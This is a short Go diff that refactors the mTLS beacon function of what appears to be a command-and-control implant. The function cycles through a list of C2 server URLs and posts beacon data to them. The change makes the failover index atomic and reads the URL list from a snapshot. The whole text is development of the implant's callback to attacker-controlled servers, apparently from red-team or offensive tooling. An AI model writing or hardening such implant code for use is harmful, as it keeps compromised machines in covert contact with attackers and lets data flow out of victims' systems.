@@ -67,10 +67,11 @@ var mtlsClient = &http.Client{
 }
 
 func sendMTLSBeacon(body []byte) []byte {
-	startIdx := currentC2Idx
-	for i := 0; i < len(C2URLs); i++ {
-		idx := (startIdx + i) % len(C2URLs)
-		c2URL := C2URLs[idx]
+	startIdx := int(currentC2Idx.Load())
+	urls := c2URLsSnapshot()
+	for i := 0; i < len(urls); i++ {
+		idx := (startIdx + i) % len(urls)
+		c2URL := urls[idx]
 
 		if !strings.HasPrefix(c2URL, "mtls://") {
 			continue
@@ -115,7 +116,7 @@ func sendMTLSBeacon(body []byte) []byte {
 		if err != nil {
 			continue
 		}
-		currentC2Idx = idx
+		currentC2Idx.Store(int32(idx))
 		if Debug {
 			fmt.Printf("[+] mTLS Beacon OK from %s, response %d bytes\n", c2URL, len(data))
 		}
